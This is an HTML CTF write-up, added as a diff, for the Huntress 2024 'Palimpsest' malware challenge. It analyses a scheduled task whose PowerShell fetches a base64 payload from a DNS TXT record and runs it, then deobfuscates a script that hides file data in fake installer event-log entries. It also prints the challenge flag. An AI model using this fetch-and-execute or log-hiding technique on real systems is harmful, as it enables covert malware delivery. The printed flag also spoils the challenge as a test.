@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Huntress 2024 Writeups</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+</head>
+<body>
+    <header>
+        <h1>Huntress CTF 2024: Palimpsest</h1>
+        <nav>
+            <ul>
+                <li><a href="../../index.html">Home</a></li>
+                <li><a href="../ctf.html">CTF</a></li>
+                <li><a href="../../projects/projects.html">Projects</a></li>
+            </ul>
+        </nav>
+    </header>
+    <article>
+        <h2>Challenge Name: Palimpsest</h2>
+        <p>Category: Malware</p>
+        <p>Author: Adam Rice (@adam.huntress)</p>
+
+        <h3>Challenge Description:</h3>
+        <p>Our IT department was setting up a new workstation and started encountering some strange errors while installing software.</p>   
+        <p>The technician noticed a strange scheduled task and luckily backed it up and grabbed some log files before wiping the machine!</p>   
+        <p>Can you figure out what's going on?</p>
+
+        <h3>Artifact Files:</h3>
+        <ul>
+            <li><a href="../../h24_files/Palimpsest/Challenge.zip">Challenge.zip (password: infected-palimpsest)</a></li>
+        </ul>
+
+        <h3>Approach</h3>
+        <p>After unzipping the archive, we are presented with some Windows Event Logs and a scheduled task named Updater Service.xml</p>
+        <p>I started by looking at the scheduled task, and noticed that it was executing a powershell command that took a base64-encoded payload from a DNS query and executed it.</p>
+        <pre><code class="language-powershell">Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName 5aa456e4dbed10b.pyrchdata.com -Type txt | Select-Object -ExpandProperty Strings))))</code></pre>
+        <p>After decoding the B64, I realized there were a few rounds of obfuscation, so I put together a binary refinery one-liner to deobfuscate it.</p>
+        <pre><code class="language-bash">dig -t txt 5aa456e4dbed10b.pyrchdata.com +short | b64 | deob-ps1 | deob-ps1 | snip 99: | snip :4526 | carve hex | hex | zl | deob-ps1 | csd intarray | xor 0x5D | deob-ps1</code></pre>
+        <p>... which produced the following powershell script:</p>
+        <pre><code class="language-powershell">$01Idu9 =[Type]"io.fiLe" 
+$a = 40000..65000
+$b =  $01Idu9::OpenWrite((Join-Path -Path ${EnV:aPpDAta} -ChildPath flag.mp4))
+Get-EventLog -LogName "Application" -Source "mslnstaller" | Where-Object { $A -contains $_."In`st`AnCe`iD" } | Sort-Object Index | ForEach-Object { $C = $_."d`ATa"; $b.Write($C, 0, $C."LeN`GTh") }
+$b.Close()</code></pre>
+        <p>Once I could see the powershell clearly, I could understand what it was doing. There was binary data embedded in events from the "Mslsnstaller" provider (masquerading as "MsInstaller"), hiding in events 40000 to 65000.</p>
+        <p>After looking at some logs from the Application.evtx file, I wrote a script to extract the binary data from the events and save it as an mp4.</p>
+        <pre><code class="language-python">import os
+from evtx import PyEvtxParser
+import json
+
+
+def extract_events(evtx_path, output_folder, min_event_id=40000, max_event_id=65000):
+    if not os.path.exists(output_folder):
+        os.makedirs(output_folder)
+
+    binary_data_list = []  # List to hold binary data for all events
+    parser = PyEvtxParser(evtx_path)
+    records = []
+
+    for record in parser.records_json():
+        jd = json.loads(record["data"])
+
+        try:
+            event_id = jd["Event"]["System"]["EventID"]["#text"]
+        except TypeError:
+            event_id = jd["Event"]["System"]["EventID"]
+        provider = jd["Event"]["System"]["Provider"]["#attributes"]["Name"]
+        if min_event_id <= event_id <= max_event_id:
+            if provider == "Mslnstaller":
+                binary_data = jd["Event"]["EventData"]["Binary"]
+                if binary_data:
+                    records.append((event_id, bytes.fromhex(binary_data)))
+
+    records.sort(key=lambda x: x[0])
+    binary_data_list = [data for _, data in records]
+
+    output_file = os.path.join(output_folder, "combined_events.mp4")
+    with open(output_file, "wb") as f:
+        for data in binary_data_list[::-1]:
+            f.write(data)
+
+
+evtx_file_path = r"Application.evtx"
+output_directory = r"Palimpsest"
+extract_events(evtx_file_path, output_directory)</code></pre>
+        <p>Flag:<code class="challenge">flag{2b7dff19886372f1z85ca267eb15zabe}</code></p>
+        <h3>Reflections</h3>
+        <p>This was a great challenge to finish the CTF with! Having seen this method of hiding data in logs in the wild, I really appreciated how well-designed this challenge was. I always love to see challenges that reflect real-world techniques, and this one definitely hit the mark.</p>
+    </article>
+</body>
+</html>
